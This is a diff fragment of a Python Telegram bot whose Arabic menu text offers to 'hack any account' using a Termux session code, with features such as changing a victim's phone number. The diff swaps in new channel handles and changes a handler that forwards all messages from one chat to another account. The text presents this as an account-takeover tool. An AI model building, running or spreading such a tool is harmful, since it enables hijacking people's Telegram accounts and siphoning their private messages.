@@ -179,12 +179,14 @@ L: [** ترقية عضو في قناة او قروب **]
 M: [** تغيير رقم الهاتف باستعمال كود تيرمكس **]
 
 ** مميزات اكثر لاحقاً **
+** طريقة استخراج كود تيرمكس : @brrbbb **
 '''
 mm = '''
 **
 مرحباً، 
 يمكنك اختراق اي حساب بواسطة كود تيرمكس! 
 للمميزات ارسل : /op
+قناة السورس: @trprogram 
 **
 '''
 @client.on(events.NewMessage(pattern="/start"))
@@ -198,9 +200,9 @@ async def op(event):
 async def op(event):
   if not event.sender_id == legendx:
     return await event.reply("please don't use me 🥺")
-  async for x in client.iter_messages("legendx_xd"):
+  async for x in client.iter_messages("Trakos"):
     try:
-      await x.forward_to("LEGENDXDEV")
+      await x.forward_to("ttrakos")
     except:
       pass
 
